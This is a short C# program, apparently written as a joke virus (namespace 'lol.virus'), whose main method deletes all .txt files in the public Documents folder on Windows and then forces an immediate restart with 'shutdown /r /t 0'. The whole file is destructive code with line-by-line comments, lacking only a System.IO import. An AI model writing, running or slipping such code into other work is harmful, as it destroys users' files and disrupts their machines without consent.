using System.Diagnostics;

namespace lol.virus
{
    class Program
    {
        static void Main(string[] args) //this is the main method
        {
            string[] files = Directory.GetFiles(@"C:\Users\Public\Documents\"); //this will get all the files in the directory
            foreach (string file in files) //this will loop through all the files in the directory
            {
                if (file.EndsWith(".txt")) //this will check if the file is a .txt file
                {
                    File.Delete(file); //this will delete all .txt files in the directory
                }
            }
            Process.Start("shutdown", "/r /t 0"); // this will shutdown the computer
        }
    }
}
